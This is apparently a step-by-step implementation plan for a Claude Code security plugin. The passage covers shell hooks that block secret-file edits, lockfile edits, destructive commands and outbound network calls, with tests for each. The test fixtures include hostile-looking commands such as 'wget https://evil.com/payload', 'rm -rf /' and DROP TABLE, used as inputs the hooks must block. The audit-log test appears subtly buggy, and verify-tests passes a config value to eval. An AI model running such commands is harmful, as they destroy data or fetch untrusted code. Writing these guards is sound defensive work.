# aegis-flow Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Transform the existing `claudecode-plugins` repo into aegis-flow — a distributable CLI + Claude Code plugin that provides a professional, secure AI workflow.

**Architecture:** Mono-plugin with CLI configurator. A single GitHub repo containing: a Node.js CLI (`npx aegis-flow init`), core hooks (shell scripts), core agents/skills (Markdown), and domain modules (crypto-forge, saas-forge, ticket-pilot) migrated from the existing plugins.

**Tech Stack:** Node.js (CLI), shell scripts (hooks), Markdown (agents/skills), vitest (CLI tests)

**Spec:** `docs/superpowers/specs/2026-03-25-aegis-flow-design.md`

---

## File Structure

```
aegis-flow/
├── cli/
│   ├── bin/aegis-flow.js                  # CLI entry point (hashbang + commander)
│   ├── package.json                       # CLI dependencies (inquirer, commander)
│   ├── src/
│   │   ├── commands/
│   │   │   ├── init.js                    # Interactive project setup
│   │   │   ├── add.js                     # Enable a module
│   │   │   ├── remove.js                  # Disable a module
│   │   │   ├── doctor.js                  # Health check
│   │   │   └── update.js                  # Update config after upgrade
│   │   ├── lib/
│   │   │   ├── detect.js                  # Project detection (lang, framework, etc.)
│   │   │   ├── config.js                  # Read/write aegis-flow.json
│   │   │   ├── hooks.js                   # Generate hooks config for settings.json
│   │   │   ├── manifest.js                # Generate plugin.json
│   │   │   └── plugin.js                  # Plugin install helper (abstracted)
│   │   └── constants.js                   # Security levels, module registry, patterns
│   └── tests/
│       ├── detect.test.js
│       ├── config.test.js
│       ├── hooks.test.js
│       ├── manifest.test.js
│       ├── init.test.js
│       └── add-remove.test.js
│
├── core/
│   ├── hooks/
│   │   ├── block-secrets.sh               # PreToolUse: block .env, *.pem, *.key
│   │   ├── protect-lockfiles.sh           # PreToolUse: block lockfile edits
│   │   ├── auto-format.sh                 # PostToolUse: run formatter
│   │   ├── validate-commands.sh           # PreToolUse: block dangerous bash commands
│   │   ├── verify-tests.sh               # Stop: run test suite, exit 2 if fail
│   │   ├── audit-log.sh                  # PostToolUse: append JSON log entry
│   │   ├── block-network.sh              # PreToolUse: block curl/wget/fetch
│   │   └── branch-protection.sh          # PreToolUse: block push to main/master
│   ├── agents/
│   │   ├── code-reviewer.md
│   │   ├── security-auditor.md
│   │   └── tdd-runner.md
│   └── skills/
│       ├── review/SKILL.md
│       ├── secure/SKILL.md
│       ├── test/SKILL.md
│       └── doctor/SKILL.md
│
├── modules/
│   ├── crypto-forge/                      # Migrated from ./crypto-forge/
│   │   ├── agents/
│   │   ├── skills/
│   │   ├── references/
│   │   └── README.md
│   ├── saas-forge/                        # Migrated from ./saas-forge/
│   │   ├── agents/
│   │   ├── skills/
│   │   └── README.md
│   └── ticket-pilot/                      # Migrated from ./ticket-pilot/
│       ├── agents/
│       ├── skills/
│       ├── scripts/
│       └── README.md
│
├── tests/
│   └── hooks/                             # Hook integration tests
│       ├── test-block-secrets.sh
│       ├── test-protect-lockfiles.sh
│       ├── test-validate-commands.sh
│       ├── test-auto-format.sh
│       ├── test-verify-tests.sh
│       ├── test-audit-log.sh
│       ├── test-block-network.sh
│       ├── test-branch-protection.sh
│       └── run-all.sh
│
├── .claude-plugin/
│   └── plugin.json
│
├── package.json                           # Workspace root (points to cli/)
├── CLAUDE.md
├── LICENSE
└── README.md
```

---

### Task 1: Repo restructure and module migration

Move existing plugins to `modules/`, clean up old plugin manifests, create the new directory skeleton.

**Files:**
- Move: `crypto-forge/` → `modules/crypto-forge/`
- Move: `saas-forge/` → `modules/saas-forge/`
- Move: `ticket-pilot/` → `modules/ticket-pilot/`
- Delete: `modules/crypto-forge/.claude-plugin/`
- Delete: `modules/saas-forge/.claude-plugin/`
- Delete: `modules/ticket-pilot/.claude-plugin/`
- Delete: `test-crypto-bot/` (test project, not part of the product)
- Create: `core/hooks/`, `core/agents/`, `core/skills/`, `cli/`, `tests/hooks/`

- [ ] **Step 1: Create the new directory structure**

```bash
mkdir -p core/hooks core/agents core/skills/{review,secure,test,doctor}
mkdir -p cli/{bin,src/{commands,lib},tests}
mkdir -p modules tests/hooks
```

- [ ] **Step 2: Move existing plugins to modules/**

```bash
git mv crypto-forge modules/crypto-forge
git mv saas-forge modules/saas-forge
git mv ticket-pilot modules/ticket-pilot
```

- [ ] **Step 3: Remove old plugin manifests**

```bash
rm -rf modules/crypto-forge/.claude-plugin
rm -rf modules/saas-forge/.claude-plugin
rm -rf modules/ticket-pilot/.claude-plugin
```

- [ ] **Step 4: Remove test-crypto-bot (not part of the product)**

```bash
rm -rf test-crypto-bot
```

- [ ] **Step 5: Remove .DS_Store files and add to .gitignore**

```bash
find . -name '.DS_Store' -delete
echo '.DS_Store' >> .gitignore
echo 'node_modules/' >> .gitignore
echo '.claude/aegis-flow-audit.log' >> .gitignore
```

- [ ] **Step 6: Commit**

```bash
git add -A
git commit -m "refactor: restructure repo into aegis-flow architecture

Move crypto-forge, saas-forge, ticket-pilot to modules/.
Remove old plugin manifests and test project.
Create core/, cli/, tests/ skeleton."
```

---

### Task 2: Core hooks — standard level (block-secrets, protect-lockfiles, auto-format)

Write the 3 shell scripts for the standard security level plus their tests.

**Files:**
- Create: `core/hooks/block-secrets.sh`
- Create: `core/hooks/protect-lockfiles.sh`
- Create: `core/hooks/auto-format.sh`
- Create: `tests/hooks/test-block-secrets.sh`
- Create: `tests/hooks/test-protect-lockfiles.sh`
- Create: `tests/hooks/test-auto-format.sh`

- [ ] **Step 1: Write the test for block-secrets**

Create `tests/hooks/test-block-secrets.sh`:

```bash
#!/bin/bash
# Tests for block-secrets hook
HOOK="$(dirname "$0")/../../core/hooks/block-secrets.sh"
PASS=0; FAIL=0

assert_blocked() {
  local desc="$1"; local input="$2"
  echo "$input" | bash "$HOOK" > /dev/null 2>&1
  if [ $? -eq 2 ]; then ((PASS++)); echo "  ✓ $desc"
  else ((FAIL++)); echo "  ✗ $desc (expected exit 2)"; fi
}

assert_allowed() {
  local desc="$1"; local input="$2"
  echo "$input" | bash "$HOOK" > /dev/null 2>&1
  if [ $? -eq 0 ]; then ((PASS++)); echo "  ✓ $desc"
  else ((FAIL++)); echo "  ✗ $desc (expected exit 0)"; fi
}

echo "block-secrets:"
assert_blocked "blocks .env" '{"tool_input":{"file_path":"/app/.env"}}'
assert_blocked "blocks .env.local" '{"tool_input":{"file_path":"/app/.env.local"}}'
assert_blocked "blocks credentials.json" '{"tool_input":{"file_path":"/app/credentials.json"}}'
assert_blocked "blocks private.pem" '{"tool_input":{"file_path":"/app/private.pem"}}'
assert_blocked "blocks server.key" '{"tool_input":{"file_path":"/app/server.key"}}'
assert_blocked "blocks nested .env" '{"tool_input":{"file_path":"/app/config/.env.production"}}'
assert_allowed "allows normal file" '{"tool_input":{"file_path":"/app/src/index.ts"}}'
assert_allowed "allows .envrc (not .env)" '{"tool_input":{"file_path":"/app/.envrc"}}'

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ $FAIL -eq 0 ] || exit 1
```

- [ ] **Step 2: Run the test to verify it fails**

```bash
chmod +x tests/hooks/test-block-secrets.sh
bash tests/hooks/test-block-secrets.sh
```

Expected: FAIL — hook script doesn't exist yet.

- [ ] **Step 3: Write block-secrets.sh**

Create `core/hooks/block-secrets.sh`:

```bash
#!/bin/bash
# aegis-flow hook: block-secrets
# Event: PreToolUse (Edit|Write)
# Blocks editing secret/credential files
INPUT=$(cat)
FILE_PATH=$(echo "$INPUT" | jq -r '.tool_input.file_path // empty')

if [ -z "$FILE_PATH" ]; then
  exit 0
fi

BASENAME=$(basename "$FILE_PATH")

# Block .env files (but not .envrc)
if [[ "$BASENAME" =~ ^\.env($|\.) ]]; then
  echo "aegis-flow: blocked editing secret file '$BASENAME'. Secrets must be managed outside Claude." >&2
  exit 2
fi

# Block credential files
if [[ "$BASENAME" =~ ^credentials\. ]]; then
  echo "aegis-flow: blocked editing credential file '$BASENAME'." >&2
  exit 2
fi

# Block private keys
if [[ "$BASENAME" =~ \.(pem|key)$ ]]; then
  echo "aegis-flow: blocked editing key file '$BASENAME'." >&2
  exit 2
fi

exit 0
```

- [ ] **Step 4: Run the test to verify it passes**

```bash
chmod +x core/hooks/block-secrets.sh
bash tests/hooks/test-block-secrets.sh
```

Expected: all 8 tests PASS.

- [ ] **Step 5: Write the test for protect-lockfiles**

Create `tests/hooks/test-protect-lockfiles.sh`:

```bash
#!/bin/bash
# Tests for protect-lockfiles hook
HOOK="$(dirname "$0")/../../core/hooks/protect-lockfiles.sh"
PASS=0; FAIL=0

assert_blocked() {
  local desc="$1"; local input="$2"
  echo "$input" | bash "$HOOK" > /dev/null 2>&1
  if [ $? -eq 2 ]; then ((PASS++)); echo "  ✓ $desc"
  else ((FAIL++)); echo "  ✗ $desc (expected exit 2)"; fi
}

assert_allowed() {
  local desc="$1"; local input="$2"
  echo "$input" | bash "$HOOK" > /dev/null 2>&1
  if [ $? -eq 0 ]; then ((PASS++)); echo "  ✓ $desc"
  else ((FAIL++)); echo "  ✗ $desc (expected exit 0)"; fi
}

echo "protect-lockfiles:"
assert_blocked "blocks package-lock.json" '{"tool_input":{"file_path":"/app/package-lock.json"}}'
assert_blocked "blocks pnpm-lock.yaml" '{"tool_input":{"file_path":"/app/pnpm-lock.yaml"}}'
assert_blocked "blocks yarn.lock" '{"tool_input":{"file_path":"/app/yarn.lock"}}'
assert_blocked "blocks Gemfile.lock" '{"tool_input":{"file_path":"/app/Gemfile.lock"}}'
assert_blocked "blocks poetry.lock" '{"tool_input":{"file_path":"/app/poetry.lock"}}'
assert_blocked "blocks bun.lockb" '{"tool_input":{"file_path":"/app/bun.lockb"}}'
assert_allowed "allows package.json" '{"tool_input":{"file_path":"/app/package.json"}}'
assert_allowed "allows normal file" '{"tool_input":{"file_path":"/app/src/lock.ts"}}'

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ $FAIL -eq 0 ] || exit 1
```

- [ ] **Step 6: Write protect-lockfiles.sh**

Create `core/hooks/protect-lockfiles.sh`:

```bash
#!/bin/bash
# aegis-flow hook: protect-lockfiles
# Event: PreToolUse (Edit|Write)
# Blocks manual modification of lockfiles
INPUT=$(cat)
FILE_PATH=$(echo "$INPUT" | jq -r '.tool_input.file_path // empty')

if [ -z "$FILE_PATH" ]; then
  exit 0
fi

BASENAME=$(basename "$FILE_PATH")

LOCKFILES="package-lock.json pnpm-lock.yaml yarn.lock Gemfile.lock poetry.lock bun.lockb Cargo.lock composer.lock"

for lockfile in $LOCKFILES; do
  if [ "$BASENAME" = "$lockfile" ]; then
    echo "aegis-flow: blocked editing lockfile '$BASENAME'. Use the package manager to update dependencies." >&2
    exit 2
  fi
done

exit 0
```

- [ ] **Step 7: Run the test to verify it passes**

```bash
chmod +x core/hooks/protect-lockfiles.sh tests/hooks/test-protect-lockfiles.sh
bash tests/hooks/test-protect-lockfiles.sh
```

Expected: all 8 tests PASS.

- [ ] **Step 8: Write the test for auto-format**

Create `tests/hooks/test-auto-format.sh`:

```bash
#!/bin/bash
# Tests for auto-format hook
# This hook reads aegis-flow.json for formatter config.
# We test with a mock config and verify the right command is built.
HOOK="$(dirname "$0")/../../core/hooks/auto-format.sh"
PASS=0; FAIL=0
TMPDIR=$(mktemp -d)

assert_output_contains() {
  local desc="$1"; local config="$2"; local input="$3"; local expected="$4"
  echo "$config" > "$TMPDIR/.claude/aegis-flow.json"
  AEGIS_CONFIG_DIR="$TMPDIR/.claude" output=$(echo "$input" | bash "$HOOK" 2>&1)
  if echo "$output" | grep -q "$expected"; then ((PASS++)); echo "  ✓ $desc"
  else ((FAIL++)); echo "  ✗ $desc (expected '$expected' in output, got: $output)"; fi
}

assert_silent_skip() {
  local desc="$1"; local config="$2"; local input="$3"
  echo "$config" > "$TMPDIR/.claude/aegis-flow.json"
  AEGIS_CONFIG_DIR="$TMPDIR/.claude" output=$(echo "$input" | bash "$HOOK" 2>&1)
  if [ -z "$output" ]; then ((PASS++)); echo "  ✓ $desc"
  else ((FAIL++)); echo "  ✗ $desc (expected silent skip, got: $output)"; fi
}

mkdir -p "$TMPDIR/.claude"

echo "auto-format:"
assert_silent_skip "skips when no formatter configured" \
  '{"project":{"formatter":""}}' \
  '{"tool_input":{"file_path":"/app/src/index.ts"}}'

assert_silent_skip "skips when no file_path" \
  '{"project":{"formatter":"prettier"}}' \
  '{"tool_input":{}}'

rm -rf "$TMPDIR"
echo ""
echo "Results: $PASS passed, $FAIL failed"
[ $FAIL -eq 0 ] || exit 1
```

- [ ] **Step 9: Write auto-format.sh**

Create `core/hooks/auto-format.sh`:

```bash
#!/bin/bash
# aegis-flow hook: auto-format
# Event: PostToolUse (Edit|Write)
# Runs the project formatter on the edited file
INPUT=$(cat)
FILE_PATH=$(echo "$INPUT" | jq -r '.tool_input.file_path // empty')

if [ -z "$FILE_PATH" ] || [ ! -f "$FILE_PATH" ]; then
  exit 0
fi

# Find config — check env override first, then standard location
CONFIG_DIR="${AEGIS_CONFIG_DIR:-.claude}"
CONFIG_FILE="$CONFIG_DIR/aegis-flow.json"

if [ ! -f "$CONFIG_FILE" ]; then
  # Try from project root (CLAUDE_PROJECT_DIR)
  if [ -n "$CLAUDE_PROJECT_DIR" ]; then
    CONFIG_FILE="$CLAUDE_PROJECT_DIR/.claude/aegis-flow.json"
  fi
fi

if [ ! -f "$CONFIG_FILE" ]; then
  exit 0
fi

FORMATTER=$(jq -r '.project.formatter // empty' "$CONFIG_FILE")

if [ -z "$FORMATTER" ]; then
  exit 0
fi

case "$FORMATTER" in
  prettier)
    npx prettier --write "$FILE_PATH" > /dev/null 2>&1
    ;;
  biome)
    npx biome format --write "$FILE_PATH" > /dev/null 2>&1
    ;;
  black)
    black "$FILE_PATH" > /dev/null 2>&1
    ;;
  rustfmt)
    rustfmt "$FILE_PATH" > /dev/null 2>&1
    ;;
esac

exit 0
```

- [ ] **Step 10: Run the test to verify it passes**

```bash
chmod +x core/hooks/auto-format.sh tests/hooks/test-auto-format.sh
bash tests/hooks/test-auto-format.sh
```

Expected: all tests PASS.

- [ ] **Step 11: Commit**

```bash
git add core/hooks/block-secrets.sh core/hooks/protect-lockfiles.sh core/hooks/auto-format.sh tests/hooks/
git commit -m "feat(core): add standard-level hooks

block-secrets: blocks .env, credentials, .pem, .key files
protect-lockfiles: blocks manual lockfile edits
auto-format: runs project formatter after file edits"
```

---

### Task 3: Core hooks — strict level (validate-commands, verify-tests, audit-log)

**Files:**
- Create: `core/hooks/validate-commands.sh`
- Create: `core/hooks/verify-tests.sh`
- Create: `core/hooks/audit-log.sh`
- Create: `tests/hooks/test-validate-commands.sh`
- Create: `tests/hooks/test-verify-tests.sh`
- Create: `tests/hooks/test-audit-log.sh`

- [ ] **Step 1: Write the test for validate-commands**

Create `tests/hooks/test-validate-commands.sh`:

```bash
#!/bin/bash
HOOK="$(dirname "$0")/../../core/hooks/validate-commands.sh"
PASS=0; FAIL=0

assert_blocked() {
  local desc="$1"; local input="$2"
  echo "$input" | bash "$HOOK" > /dev/null 2>&1
  if [ $? -eq 2 ]; then ((PASS++)); echo "  ✓ $desc"
  else ((FAIL++)); echo "  ✗ $desc (expected exit 2)"; fi
}

assert_allowed() {
  local desc="$1"; local input="$2"
  echo "$input" | bash "$HOOK" > /dev/null 2>&1
  if [ $? -eq 0 ]; then ((PASS++)); echo "  ✓ $desc"
  else ((FAIL++)); echo "  ✗ $desc (expected exit 0)"; fi
}

echo "validate-commands:"
assert_blocked "blocks rm -rf /" '{"tool_input":{"command":"rm -rf /"}}'
assert_blocked "blocks rm -rf ~" '{"tool_input":{"command":"rm -rf ~"}}'
assert_blocked "blocks git push --force" '{"tool_input":{"command":"git push --force origin main"}}'
assert_blocked "blocks git push -f" '{"tool_input":{"command":"git push -f"}}'
assert_blocked "blocks git reset --hard" '{"tool_input":{"command":"git reset --hard HEAD~5"}}'
assert_blocked "blocks DROP TABLE" '{"tool_input":{"command":"psql -c \"DROP TABLE users\""}}'
assert_blocked "blocks TRUNCATE" '{"tool_input":{"command":"mysql -e \"TRUNCATE users\""}}'
assert_blocked "blocks chmod 777" '{"tool_input":{"command":"chmod 777 /app"}}'
assert_allowed "allows normal git push" '{"tool_input":{"command":"git push origin feature"}}'
assert_allowed "allows rm of specific file" '{"tool_input":{"command":"rm src/old-file.ts"}}'
assert_allowed "allows normal command" '{"tool_input":{"command":"npm test"}}'
assert_allowed "allows git reset --soft" '{"tool_input":{"command":"git reset --soft HEAD~1"}}'

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ $FAIL -eq 0 ] || exit 1
```

- [ ] **Step 2: Write validate-commands.sh**

Create `core/hooks/validate-commands.sh`:

```bash
#!/bin/bash
# aegis-flow hook: validate-commands
# Event: PreToolUse (Bash)
# Blocks dangerous shell commands
INPUT=$(cat)
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')

if [ -z "$COMMAND" ]; then
  exit 0
fi

# rm -rf with dangerous targets (/, ~, $HOME, .)
if echo "$COMMAND" | grep -qE 'rm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+.*-[a-zA-Z]*r|-[a-zA-Z]*r[a-zA-Z]*\s+.*-[a-zA-Z]*f|-rf|-fr)\s+(/|~|\$HOME|\.)(\s|$)'; then
  echo "aegis-flow: blocked dangerous rm command. Specify exact paths to delete." >&2
  exit 2
fi

# git push --force / -f
if echo "$COMMAND" | grep -qE 'git\s+push\s+.*(--force|-f)'; then
  echo "aegis-flow: blocked force push. Use --force-with-lease if you must override." >&2
  exit 2
fi

# git reset --hard
if echo "$COMMAND" | grep -qE 'git\s+reset\s+--hard'; then
  echo "aegis-flow: blocked git reset --hard. Use --soft or --mixed to preserve changes." >&2
  exit 2
fi

# SQL destructive commands
if echo "$COMMAND" | grep -qiE '(DROP\s+TABLE|DROP\s+DATABASE|TRUNCATE)'; then
  echo "aegis-flow: blocked destructive SQL command." >&2
  exit 2
fi

# chmod 777
if echo "$COMMAND" | grep -qE 'chmod\s+777'; then
  echo "aegis-flow: blocked chmod 777. Use more restrictive permissions." >&2
  exit 2
fi

exit 0
```

- [ ] **Step 3: Run the test**

```bash
chmod +x core/hooks/validate-commands.sh tests/hooks/test-validate-commands.sh
bash tests/hooks/test-validate-commands.sh
```

Expected: all 12 tests PASS.

- [ ] **Step 4: Write the test for verify-tests**

Create `tests/hooks/test-verify-tests.sh`:

```bash
#!/bin/bash
HOOK="$(dirname "$0")/../../core/hooks/verify-tests.sh"
PASS=0; FAIL=0
TMPDIR=$(mktemp -d)

echo "verify-tests:"

# Test: exits 0 when no config found
echo '{}' | AEGIS_CONFIG_DIR="$TMPDIR/nonexistent" bash "$HOOK" > /dev/null 2>&1
if [ $? -eq 0 ]; then ((PASS++)); echo "  ✓ exits 0 when no config"
else ((FAIL++)); echo "  ✗ exits 0 when no config"; fi

# Test: exits 0 when no testRunner configured
mkdir -p "$TMPDIR/.claude"
echo '{"project":{"testRunner":""}}' > "$TMPDIR/.claude/aegis-flow.json"
echo '{}' | AEGIS_CONFIG_DIR="$TMPDIR/.claude" bash "$HOOK" > /dev/null 2>&1
if [ $? -eq 0 ]; then ((PASS++)); echo "  ✓ exits 0 when no testRunner"
else ((FAIL++)); echo "  ✗ exits 0 when no testRunner"; fi

rm -rf "$TMPDIR"
echo ""
echo "Results: $PASS passed, $FAIL failed"
[ $FAIL -eq 0 ] || exit 1
```

- [ ] **Step 5: Write verify-tests.sh**

Create `core/hooks/verify-tests.sh`:

```bash
#!/bin/bash
# aegis-flow hook: verify-tests
# Event: Stop
# Runs the test suite; if it fails, exit 2 so Claude keeps working
INPUT=$(cat)

CONFIG_DIR="${AEGIS_CONFIG_DIR:-.claude}"
CONFIG_FILE="$CONFIG_DIR/aegis-flow.json"

if [ -n "$CLAUDE_PROJECT_DIR" ] && [ ! -f "$CONFIG_FILE" ]; then
  CONFIG_FILE="$CLAUDE_PROJECT_DIR/.claude/aegis-flow.json"
fi

if [ ! -f "$CONFIG_FILE" ]; then
  exit 0
fi

TEST_RUNNER=$(jq -r '.project.testRunner // empty' "$CONFIG_FILE")

if [ -z "$TEST_RUNNER" ]; then
  exit 0
fi

# Determine test command based on runner
case "$TEST_RUNNER" in
  vitest)   TEST_CMD="npx vitest run --reporter=verbose" ;;
  jest)     TEST_CMD="npx jest --verbose" ;;
  pytest)   TEST_CMD="pytest -v" ;;
  mocha)    TEST_CMD="npx mocha" ;;
  rspec)    TEST_CMD="bundle exec rspec" ;;
  *)        TEST_CMD="$TEST_RUNNER" ;;
esac

# Run the tests
OUTPUT=$(eval "$TEST_CMD" 2>&1)
EXIT_CODE=$?

if [ $EXIT_CODE -ne 0 ]; then
  echo "aegis-flow: tests failed. Fix them before finishing." >&2
  echo "$OUTPUT" >&2
  exit 2
fi

exit 0
```

- [ ] **Step 6: Run the test**

```bash
chmod +x core/hooks/verify-tests.sh tests/hooks/test-verify-tests.sh
bash tests/hooks/test-verify-tests.sh
```

Expected: all tests PASS.

- [ ] **Step 7: Write the test for audit-log**

Create `tests/hooks/test-audit-log.sh`:

```bash
#!/bin/bash
HOOK="$(dirname "$0")/../../core/hooks/audit-log.sh"
PASS=0; FAIL=0
TMPDIR=$(mktemp -d)
mkdir -p "$TMPDIR/.claude"

echo "audit-log:"

# Test: creates log entry with correct fields
AEGIS_CONFIG_DIR="$TMPDIR/.claude" echo '{"tool_name":"Edit","tool_input":{"file_path":"/app/src/index.ts"},"tool_result":"success"}' | bash "$HOOK" > /dev/null 2>&1
LOG_FILE="$TMPDIR/.claude/aegis-flow-audit.log"
if [ -f "$LOG_FILE" ] && jq -e '.tool' "$LOG_FILE" > /dev/null 2>&1; then
  ((PASS++)); echo "  ✓ creates log entry"
else
  ((FAIL++)); echo "  ✗ creates log entry"
fi

# Test: log entry has timestamp
if jq -e '.timestamp' "$LOG_FILE" > /dev/null 2>&1; then
  ((PASS++)); echo "  ✓ log entry has timestamp"
else
  ((FAIL++)); echo "  ✗ log entry has timestamp"
fi

# Test: log entry has tool name
if jq -e 'select(.tool=="Edit")' "$LOG_FILE" > /dev/null 2>&1; then
  ((PASS++)); echo "  ✓ log entry has tool name"
else
  ((FAIL++)); echo "  ✗ log entry has tool name"
fi

rm -rf "$TMPDIR"
echo ""
echo "Results: $PASS passed, $FAIL failed"
[ $FAIL -eq 0 ] || exit 1
```

- [ ] **Step 8: Write audit-log.sh**

Create `core/hooks/audit-log.sh`:

```bash
#!/bin/bash
# aegis-flow hook: audit-log
# Event: PostToolUse (all tools)
# Appends a JSON log entry for each tool use
INPUT=$(cat)

CONFIG_DIR="${AEGIS_CONFIG_DIR:-.claude}"
LOG_FILE="$CONFIG_DIR/aegis-flow-audit.log"

if [ -n "$CLAUDE_PROJECT_DIR" ] && [ ! -d "$CONFIG_DIR" ]; then
  CONFIG_DIR="$CLAUDE_PROJECT_DIR/.claude"
  LOG_FILE="$CONFIG_DIR/aegis-flow-audit.log"
fi

TOOL=$(echo "$INPUT" | jq -r '.tool_name // "unknown"')
FILE_PATH=$(echo "$INPUT" | jq -r '.tool_input.file_path // .tool_input.command // "n/a"' | head -c 200)
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

jq -n \
  --arg ts "$TIMESTAMP" \
  --arg tool "$TOOL" \
  --arg target "$FILE_PATH" \
  '{timestamp: $ts, tool: $tool, target: $target}' >> "$LOG_FILE"

exit 0
```

- [ ] **Step 9: Run the test**

```bash
chmod +x core/hooks/audit-log.sh tests/hooks/test-audit-log.sh
bash tests/hooks/test-audit-log.sh
```

Expected: all 3 tests PASS.

- [ ] **Step 10: Commit**

```bash
git add core/hooks/validate-commands.sh core/hooks/verify-tests.sh core/hooks/audit-log.sh tests/hooks/
git commit -m "feat(core): add strict-level hooks

validate-commands: blocks rm -rf, force push, reset --hard, SQL drops, chmod 777
verify-tests: runs test suite before Claude finishes, blocks if failing
audit-log: appends JSON entry for each tool use"
```

---

### Task 4: Core hooks — paranoid level (block-network, branch-protection)

**Files:**
- Create: `core/hooks/block-network.sh`
- Create: `core/hooks/branch-protection.sh`
- Create: `tests/hooks/test-block-network.sh`
- Create: `tests/hooks/test-branch-protection.sh`
- Create: `tests/hooks/run-all.sh`

- [ ] **Step 1: Write the test for block-network**

Create `tests/hooks/test-block-network.sh`:

```bash
#!/bin/bash
HOOK="$(dirname "$0")/../../core/hooks/block-network.sh"
PASS=0; FAIL=0

assert_blocked() {
  local desc="$1"; local input="$2"
  echo "$input" | bash "$HOOK" > /dev/null 2>&1
  if [ $? -eq 2 ]; then ((PASS++)); echo "  ✓ $desc"
  else ((FAIL++)); echo "  ✗ $desc (expected exit 2)"; fi
}

assert_allowed() {
  local desc="$1"; local input="$2"
  echo "$input" | bash "$HOOK" > /dev/null 2>&1
  if [ $? -eq 0 ]; then ((PASS++)); echo "  ✓ $desc"
  else ((FAIL++)); echo "  ✗ $desc (expected exit 0)"; fi
}

echo "block-network:"
assert_blocked "blocks curl" '{"tool_input":{"command":"curl https://evil.com"}}'
assert_blocked "blocks wget" '{"tool_input":{"command":"wget https://evil.com/payload"}}'
assert_blocked "blocks curl in pipe" '{"tool_input":{"command":"curl -s api.com | jq ."}}'
assert_allowed "allows npm install" '{"tool_input":{"command":"npm install express"}}'
assert_allowed "allows git fetch" '{"tool_input":{"command":"git fetch origin"}}'
assert_allowed "allows local commands" '{"tool_input":{"command":"ls -la"}}'

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ $FAIL -eq 0 ] || exit 1
```

- [ ] **Step 2: Write block-network.sh**

Create `core/hooks/block-network.sh`:

```bash
#!/bin/bash
# aegis-flow hook: block-network
# Event: PreToolUse (Bash)
# Blocks outbound network commands (paranoid mode)
INPUT=$(cat)
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')

if [ -z "$COMMAND" ]; then
  exit 0
fi

# Block curl, wget
if echo "$COMMAND" | grep -qE '\b(curl|wget)\b'; then
  echo "aegis-flow [paranoid]: blocked outbound network call. Whitelist domains in aegis-flow.json if needed." >&2
  exit 2
fi

exit 0
```

- [ ] **Step 3: Run the test**

```bash
chmod +x core/hooks/block-network.sh tests/hooks/test-block-network.sh
bash tests/hooks/test-block-network.sh
```

Expected: all 6 tests PASS.

- [ ] **Step 4: Write the test for branch-protection**

Create `tests/hooks/test-branch-protection.sh`:

```bash
#!/bin/bash
HOOK="$(dirname "$0")/../../core/hooks/branch-protection.sh"
PASS=0; FAIL=0

assert_blocked() {
  local desc="$1"; local input="$2"
  echo "$input" | bash "$HOOK" > /dev/null 2>&1
  if [ $? -eq 2 ]; then ((PASS++)); echo "  ✓ $desc"
  else ((FAIL++)); echo "  ✗ $desc (expected exit 2)"; fi
}

assert_allowed() {
  local desc="$1"; local input="$2"
  echo "$input" | bash "$HOOK" > /dev/null 2>&1
  if [ $? -eq 0 ]; then ((PASS++)); echo "  ✓ $desc"
  else ((FAIL++)); echo "  ✗ $desc (expected exit 0)"; fi
}

echo "branch-protection:"
assert_blocked "blocks push to main" '{"tool_input":{"command":"git push origin main"}}'
assert_blocked "blocks push to master" '{"tool_input":{"command":"git push origin master"}}'

# Mock current branch for commit test
AEGIS_CURRENT_BRANCH=main assert_blocked "blocks commit on main" '{"tool_input":{"command":"git commit -m \"fix\""}}'
AEGIS_CURRENT_BRANCH=feat/login assert_allowed "allows commit on feature branch" '{"tool_input":{"command":"git commit -m \"fix\""}}'

assert_allowed "allows push to feature branch" '{"tool_input":{"command":"git push origin feat/login"}}'
assert_allowed "allows non-git commands" '{"tool_input":{"command":"npm test"}}'

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ $FAIL -eq 0 ] || exit 1
```

The test uses `AEGIS_CURRENT_BRANCH` env var to mock the current git branch — the hook checks this var first before calling `git rev-parse`.

- [ ] **Step 5: Write branch-protection.sh**

Create `core/hooks/branch-protection.sh`:

```bash
#!/bin/bash
# aegis-flow hook: branch-protection
# Event: PreToolUse (Bash)
# Blocks direct push/commit to main/master (paranoid mode)
INPUT=$(cat)
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')

if [ -z "$COMMAND" ]; then
  exit 0
fi

# Block git push to main/master
if echo "$COMMAND" | grep -qE 'git\s+push\s+\S+\s+(main|master)(\s|$)'; then
  echo "aegis-flow [paranoid]: blocked push to protected branch. Use a feature branch." >&2
  exit 2
fi

# Block git commit when on main/master
if echo "$COMMAND" | grep -qE 'git\s+commit'; then
  CURRENT_BRANCH="${AEGIS_CURRENT_BRANCH:-$(git rev-parse --abbrev-ref HEAD 2>/dev/null)}"
  if [ "$CURRENT_BRANCH" = "main" ] || [ "$CURRENT_BRANCH" = "master" ]; then
    echo "aegis-flow [paranoid]: blocked commit on '$CURRENT_BRANCH'. Create a feature branch first." >&2
    exit 2
  fi
fi

exit 0
```

- [ ] **Step 6: Run the test**

```bash
chmod +x core/hooks/branch-protection.sh tests/hooks/test-branch-protection.sh
bash tests/hooks/test-branch-protection.sh
```

Expected: PASS (the commit test depends on current branch — on `main` it blocks, which is correct for our repo).

- [ ] **Step 7: Write run-all.sh**

Create `tests/hooks/run-all.sh`:

```bash
#!/bin/bash
# Run all hook tests
DIR="$(dirname "$0")"
TOTAL_PASS=0; TOTAL_FAIL=0

for test_file in "$DIR"/test-*.sh; do
  echo "--- $(basename "$test_file") ---"
  bash "$test_file"
  if [ $? -ne 0 ]; then ((TOTAL_FAIL++)); else ((TOTAL_PASS++)); fi
  echo ""
done

echo "=== Hook test suites: $TOTAL_PASS passed, $TOTAL_FAIL failed ==="
[ $TOTAL_FAIL -eq 0 ] || exit 1
```

- [ ] **Step 8: Run all hook tests**

```bash
chmod +x tests/hooks/run-all.sh
bash tests/hooks/run-all.sh
```

Expected: all test suites PASS.

- [ ] **Step 9: Commit**

